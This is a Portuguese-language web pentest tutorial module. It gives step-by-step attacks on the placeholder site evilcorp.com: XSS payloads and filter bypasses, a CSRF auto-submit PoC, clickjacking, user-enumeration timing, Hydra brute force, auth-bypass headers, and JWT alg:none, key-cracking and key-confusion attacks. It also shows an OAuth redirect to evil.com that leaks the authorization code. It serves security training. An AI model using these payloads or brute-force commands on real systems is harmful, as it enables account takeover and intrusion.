## FASE 4 — Cliente e Autenticação (XSS, CSRF, Clickjacking, Auth, JWT, OAuth)

**Tempo estimado:** 90-120 minutos
**Objetivo:** Testar as vulnerabilidades que exploram o navegador do usuário (XSS, CSRF, clickjacking, DOM) E todo o ciclo de autenticação (enumeração, bypass, JWT, OAuth).
**Por quê:** Um XSS rouba sessões, um CSRF transfere dinheiro sem querer, e se você bypassa login/autorização todas as outras proteções são inúteis.

> **📡 Herança das fases anteriores:** vetores definidos por `09-descoberta/headers.txt` (Fase 2, testada a partir de `08-alimentacao/headers-web.txt` ← MANUAL-RECON `02-enum/headers.txt`):

| Header ausente | Vetor de teste |
|----------------|----------------|
| `X-Frame-Options` | Clickjacking (Passo 4C) |
| `Content-Security-Policy` | XSS com mais chance (Passo 4A) |
| `Strict-Transport-Security` | Downgrade HTTP |
| `X-Content-Type-Options` | MIME sniffing |

> **📡 XSS com base no fingerprint (Módulo 01):** se `08-alimentacao/fingerprint-web.txt` (gerado na Fase 1 a partir de `03-fingerprint/whatweb-principal.txt` e `03-fingerprint/httpx-tech.txt` do MANUAL-RECON) mostra versões antigas, pesquise CVEs antes de payloads genéricos: **jQuery < 3.5.0** (`searchsploit jquery <versão>`), **Angular.js < 1.8.3** (sandbox escape), **Bootstrap < 5.3** (XSS em tooltips). Não teste genérico quando existe CVE documentada para a stack.

---

## 4A: Cross-Site Scripting (XSS)

### Passo 4A.1 — Teste Básico de Reflected XSS

**O que você vai fazer:** Verificar se parâmetros de URL são refletidos no HTML sem sanitização.

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: evilcorp.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
... <h1>Resultados para: <script>alert('XSS')</script></h1> ...
```

**✅ Output esperado (NÃO vulnerável):**
```
... <h1>Resultados para: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</h1> ...
```
Entities (`&lt;`, `&gt;`) → sanitize funcionando → não vulnerável neste parâmetro.

**Como confirmar:** copie a URL → abra no Firefox com proxy → se aparecer alert → **XSS confirmado**.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `<script>` retorna erro | WAF bloqueia tag | Payloads alternativos (Passo 4A.3) |
| Reflete mas não executa | CSP bloqueia inline | Verifique CSP (Passo 4A.6) |
| Não reflete em lugar nenhum | Input fora do HTML | Outros parâmetros da Fase 2 |

### Passo 4A.2 — Teste de Stored XSS

1. Encontre form de input (comentário, perfil, mensagem)
2. No Burp Repeater:
```http
POST /api/comments HTTP/1.1
Host: evilcorp.com
Content-Type: application/json

{"comment": "<img src=x onerror=alert('XSS')>"}
```
3. Acesse a página onde o comentário aparece → alert → **Stored XSS confirmado**

**❌ Se der errado:** sanitização → tente `<img src=x onerror=alert(1)>` (sem aspas) ou handlers `onmouseover`/`onfocus`; só admin comenta → teste em perfil público.

### Passo 4A.3 — Bypass de Filtros

**Sem tag script:**
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
```

**Case:** `<ScRiPt>alert('XSS')</ScRiPt>` · **Encoding:** `%3Cscript%3E...%3C/script%3E` · **Protocol:** `javascript:alert('XSS')` · **Data URI:** `data:text/html,<script>alert('XSS')</script>`

**Polyglot (múltiplos contextos):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

**❌ Se der errado:** tudo bloqueado → Out-of-Band via Burp Collaborator; executa mas sem alert → console do DevTools (F12).

### Passo 4A.4 — XSS em Attributes

```
" onfocus="alert('XSS')" autofocus="
" onmouseover="alert('XSS')"
" onclick="alert('XSS')"
```
O input "quebra" o attribute HTML e injeta novo event handler.

### Passo 4A.5 — DOM XSS

1. No Burp: **Proxy → HTTP history** → requests que retornam JavaScript
2. Procure sinks: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `location.hash`, `document.location`
3. **Se parâmetro de URL chega a sink sem sanitização → DOM XSS**

**Como testar:** Firefox F12 → Console → procure `innerHTML`/`document.write`/`eval` usando `location.search`, `location.hash` ou `document.referrer`.

### Passo 4A.6 — Verificar CSP

```bash
curl -sI https://evilcorp.com | grep -i "content-security-policy"
```

Sem output → **sem CSP → XSS sem restrições**. Com CSP:

| CSP Config | Bypass |
|------------|--------|
| `script-src 'self'` | JS de path que você controla no mesmo domínio |
| `script-src 'unsafe-inline'` | XSS funciona normalmente |
| `script-src 'nonce-...'` | Nonce roubado via outro vetor |
| `script-src` CDN | CDN comprometido / DOM Clobbering |

**❌ Se der errado:** CSP robusto → foque em DOM XSS (não depende de inline script).

---

## 4B: Cross-Site Request Forgery (CSRF)

### Passo 4B.1 — Teste Básico

```http
POST /api/transfer HTTP/1.1
Host: evilcorp.com
Content-Type: application/x-www-form-urlencoded

from=account1&to=account2&amount=1000
```

- **200 OK sem token → VULNERÁVEL** (`{"success": true, "transfer_id": 12345}`)
- **403 `{"error": "Invalid CSRF token"}` → protegido**

### Passo 4B.2 — Gerar PoC CSRF

No Burp: request POST no history → **Engagement tools → Generate CSRF PoC** → copie o HTML:

```html
<form action="https://evilcorp.com/api/transfer" method="POST">
  <input type="hidden" name="from" value="account1">
  <input type="hidden" name="to" value="account2">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

Salve como `11-cliente-auth/csrf-poc.html` → abra no Firefox SEM proxy → transferência acontecer → **CSRF confirmado**.

### Passo 4B.3 — Verificar SameSite Cookie

No Response do Burp: `Set-Cookie: session=abc123; Path=/; Secure; HttpOnly`

| Cookie Attribute | Proteção CSRF |
|------------------|---------------|
| `SameSite=Strict` | Bloqueia todos |
| `SameSite=Lax` | Bloqueia POST, permite GET |
| `SameSite=None` ou ausente | **Sem proteção (vulnerável)** |

**❌ Se der errado:** token obrigatório → teste sem token, token inválido, token reutilizado (validação pode ser falha).

---

## 4C: Clickjacking

### Passo 4C.1 — Teste Básico

```bash
curl -I https://evilcorp.com | grep -i "x-frame-options\|content-security-policy"
```

Sem `X-Frame-Options` NEM `Content-Security-Policy: frame-ancestors` → **VULNERÁVEL**.

### Passo 4C.2 — Criar Página de Teste

Salve `11-cliente-auth/clickjacking-test.html`:
```html
<!DOCTYPE html>
<html><head><style>iframe{width:800px;height:600px;opacity:.5;border:2px solid red}</style></head>
<body><h1>Clickjacking Test</h1><iframe src="https://evilcorp.com"></iframe></body></html>
```
Abra no Firefox → site aparece no iframe → **Clickjacking confirmado**.

**❌ Se der errado:** iframe vazio/erro → site protegido (X-Frame-Options/frame-ancestors ativo).

---

## 4D: DOM Clobbering

```http
GET /page?name=<a id="config" href="javascript:alert('XSS')">click</a> HTTP/1.1
Host: evilcorp.com
```
Se o JS usa `document.getElementById('config')` sem sanitização → vulnerável.

---

## 4E: Enumeração de Usuários

### 📡 Endpoints de Login (Módulo 01)

Filtre `08-alimentacao/endpoints-web.txt` por `login|auth|signin|register` — `/api/auth/login`, `/api/v2/admin/login` etc. são os primeiros alvos. O `09-descoberta/logins-formularios.txt` da Fase 2 já mapeou esses forms.

### Passo 4E.1 — Mensagens de Erro Diferentes

```http
POST /api/login HTTP/1.1
Host: evilcorp.com
Content-Type: application/json

{"username": "admin", "password": "senha_incorreta_123"}
```

- **`{"error": "User not found"}` → VULNERÁVEL** (confirma quais usuários existem)
- **`{"error": "Invalid credentials"}` → seguro** (mensagem genérica)

**❌ Se der errado:** sempre igual → teste timing (Passo 4E.2); 403 em vez de 401 → auth via header; rate limit → delay entre requests.

### Passo 4E.2 — Enumeração via Timing

```bash
for user in admin root administrator test user nonexistentuser123; do
  echo -n "$user: "
  time curl -s -o /dev/null -X POST https://evilcorp.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"wrong123\"}" 2>&1 | grep real
done
```

**✅ Output esperado (VULNERÁVEL):**
```
admin: 0m0.456s
nonexistentuser123: 0m0.102s
```
Usuários existentes demoram ~400ms (busca no banco + hash); não existentes ~100ms → diferença confirma.

**❌ Se der errado:** tempo constante → enumeração via registro (Passo 4E.3); rate limit → `sleep 1` entre requests.

### Passo 4E.3 — Enumeração via Registration

```http
POST /api/register HTTP/1.1
{"username": "admin", "email": "test@test.com", "password": "Test1234!"}
```
- **`409 Conflict {"error": "Username already exists"}` → VULNERÁVEL**
- 400 genérico → mude o email (pode ser unique); sem rota de registro → fique no timing.

---

## 4F: Brute Force

> 💡 **Brute force pesado é o coração do Módulo 03** (MANUAL-EXPLOR, Fase 2) — ele importa `09-descoberta/logins-formularios.txt` (Passo 2.9) como `15-alimentacao/formularios.txt`. Aqui, teste apenas o básico para alimentar aquilo.

### Passo 4F.1 — Hydra (teste rápido)

```bash
sudo apt install hydra -y
hydra -V   # esperado: Hydra v9.x

# Mensagem de erro EXATA do login falhou (copie do Burp → salve /tmp/login-fail.txt)
hydra -l admin -P /usr/share/wordlists/rockyou.txt evilcorp.com \
  https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

| Flag | Função |
|------|--------|
| `-l admin` | Username fixo |
| `-P rockyou.txt` | Lista de senhas |
| `https-post-form` | POST via HTTPS |
| `:Invalid credentials` | Mensagem EXATA de falha (senão tudo vira falha) |

**✅ Output esperado (senha encontrada):**
```
[80][https-post-form] host: evilcorp.com   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**❌ Se der errado:** 0 matches → mensagem de erro errada; trava em TLS → `-f` (para no 1º hit); rate limit → `-w 5` (5s entre tentativas); lento → wordlist menor (`seclists/Passwords/Common-Credentials/`).

**Múltiplos usuários:** `-L /tmp/users.txt` (só quando enumeração falhou — fica MUITO mais lento).

### Passo 4F.2 — Burp Intruder

Request de login → **Send to Intruder** → aba Positions: **Clear §** + **Add §** no campo senha → aba Payloads: Simple list + load rockyou → **Start attack** → filtre por tamanho de response diferente.

---

## 4G: Bypass de Autenticação

### Passo 4G.1 — Bypass de Authorization

```http
GET /api/admin/users HTTP/1.1            ← sem auth
GET /api/admin/users HTTP/1.1            ← token inválido
Authorization: Bearer invalid_token_aqui
GET /api/admin/users HTTP/1.1            ← token de user comum (IDOR)
Authorization: Bearer token_do_usuario_comum
```

- **200 sem auth → sem autorização no endpoint**
- **200 com token inválido → validação de token não funciona**
- **200 com token de user comum em rota admin → falta verificação de role**

### Passo 4G.2 — Bypass via HTTP Method

`PUT`/`DELETE`/`PATCH` em rota admin — algumas apps bloqueiam GET/POST mas esquecem os demais (use `09-descoberta/methods.txt` da Fase 2).

### Passo 4G.3 — Bypass via Path Traversal

```http
GET /api/../admin/users HTTP/1.1
GET /api/admin/users HTTP/1.1
X-Original-URL: /api/admin/users
GET /api/admin/users HTTP/1.1
X-Rewrite-URL: /api/admin/users
```
O servidor valida a URL original mas não a normalizada; `../` sobe de diretório e os headers redirecionam a validação.

**❌ Se der errado:** todos 401/403 → auth robusta; token válido obrigatório → ataques JWT (seção 4H).

---

## 4H: JWT Attacks

### Passo 4H.1 — Decodificar JWT

JWT = 3 partes Base64 separadas por `.`: `header.payload.signature`. **O payload NÃO é criptografado** — só Base64; a segurança está na assinatura.

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
# {"alg":"HS256","typ":"JWT"}   → HS256 = HMAC (brute force de chave);
                                  # RS256 = RSA (key injection);
                                  # none = SEM ASSINATURA (bypass total)

echo "eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ" | base64 -d 2>/dev/null
# {"username":"admin","role":"user"}   → role→admin, user_id→outro (IDOR), exp→remover
```

**❌ Se der errado:** Base64 com `-`/`_` → URL-safe, ajuste padding `=`; não acha token → verifique Cookie, Authorization, X-Auth-Token.

**Usando jwt_tool (mais completo):**
```bash
git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool
pip install -r requirements.txt
python3 jwt_tool.py <JWT_TOKEN> -T
```

### Passo 4H.2 — JWT Algorithm None

```bash
# Novo header {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# Novo payload {"username":"admin","role":"admin"}
echo -n '{"username":"admin","role":"admin"}' | base64 | tr -d '='
# Montar: header.payload.   (PONTO NO FINAL, sem assinatura)
```

```http
GET /api/admin HTTP/1.1
Host: evilcorp.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

- **200 OK → bypass completo de autenticação**
- **401 → servidor valida assinatura** → vá para Passo 4H.3

**❌ Se der errado:** 400 → formato inválido (verifique `.` final e padding).

### Passo 4H.3 — JWT Weak Key (brute force da chave)

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt   # 16500 = JWT HMAC
```

**✅ Chave encontrada:**
```
eyJhbGci...In0.eyJ1c2Vy...fQ:secret123
```
Com a chave, assine JWTs arbitrários.

Alternativa CPU: `python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt`

**❌ Se der errado:** hashcat sem `-m 16500` → `sudo apt update && sudo apt install hashcat -y`; chave não achada → wordlist maior ou outro vetor.

### Passo 4H.4 — JWT Key Injection (RS256 → HS256)

```bash
curl -s https://evilcorp.com/.well-known/jwks.json | python3 -m json.tool
python3 jwt_tool.py <JWT_TOKEN> -X k   # key injection automática
```
Alguns servidores verificam com RS256 mas aceitam HS256 usando a MESMA chave — assine com a chave pública exposta.

---

## 4I: OAuth Attacks

### Passo 4I.1 — Redirect URI Bypass

```http
GET /oauth/authorize?client_id=abc123&redirect_uri=https://evil.com/callback HTTP/1.1
```

- **`302 Location: https://evil.com/callback?code=...` → VULNERÁVEL** (token vai para o atacante)
- **`400 {"error": "invalid_redirect_uri"}` → seguro**

### Passo 4I.2 — State Parameter CSRF

Sem `state` obrigatório no authorize → **CSRF no fluxo OAuth** (atacante força vínculo da conta dele).

---

### Checklist da Fase 4

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | XSS refletido testado | `11-cliente-auth/xss-reflected.txt` | [ ] |
| 2 | XSS armazenado testado | `11-cliente-auth/xss-stored.txt` | [ ] |
| 3 | XSS bypass testado | `11-cliente-auth/xss-bypass.txt` | [ ] |
| 4 | DOM XSS verificado | `11-cliente-auth/dom-xss.txt` | [ ] |
| 5 | CSP verificado | `11-cliente-auth/csp.txt` | [ ] |
| 6 | CSRF testado + PoC | `11-cliente-auth/csrf-poc.html` | [ ] |
| 7 | Clickjacking testado | `11-cliente-auth/clickjacking-test.html` | [ ] |
| 8 | Cookies SameSite verificados | `11-cliente-auth/cookies.txt` | [ ] |
| 9 | Enumeração de usuários | `11-cliente-auth/user-enumeration.txt` | [ ] |
| 10 | Brute force básico | `11-cliente-auth/brute-force.txt` | [ ] |
| 11 | Bypass de authorization | `11-cliente-auth/auth-bypass.txt` | [ ] |
| 12 | JWT analisado | `11-cliente-auth/jwt-analysis.txt` | [ ] |
| 13 | JWT alg:none / weak key | `11-cliente-auth/jwt-alg-none.txt` | [ ] |
| 14 | OAuth testado | `11-cliente-auth/oauth.txt` | [ ] |

### ✅ Sinal de sucesso:
- **≥ 1 XSS confirmado** (reflected, stored ou DOM)
- **CSRF PoC funcional** OU clickjacking demonstrado
- **≥ 1 vulnerabilidade de auth** (enumeração, bypass, JWT ou OAuth) OU ≥ 3 parâmetros XSS testados

### ❌ Se falhou:
- XSS bloqueado por WAF → bypass com encoding (4A.3)
- Auth bem implementada → timing attacks + enumeração via registro
- JWT com algoritmo forte → weak key com hashcat

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 4 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `xss-reflected.txt` | Fase 6 (Validação) | Confirmar exploit reproduzível |
| `csrf-poc.html` | Fase 7 (Relatório) | Demonstrar impacto ao cliente |
| `cookies.txt` / `csp.txt` | Fase 7 | Documentar configuração de segurança |
| `auth-bypass.txt` / `jwt-analysis.txt` | Fase 7 | Documentar bypass e vulnerabilidades JWT |
| `brute-force.txt` | Fase 6 | Confirmar credenciais comprometidas |
| `logins-formularios.txt` (Fase 2) | **Módulo 03** | Brute force HTTP completo |

**Se completou tudo → Avance para [Fase 5 — Vetores Especializados](11-fase5-especializados.md)**

---

## Mini-Checkpoint: Resolva Labs de XSS e Auth

1. XSS: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-notarily-blocking-quotes
2. Auth: https://portswigger.net/web-security/authentication/username-enumeration/lab-subtly-different-responses
3. No Burp Repeater, injete `<script>alert('XSS')</script>` → confirme no HTML sem encode → alert no Firefox
4. Compare responses de usuários existentes/não existentes → identifique a diferença

**Se conseguiu → avance. Se não → revise 4A.3 (bypass) e 4E (enumeração).**
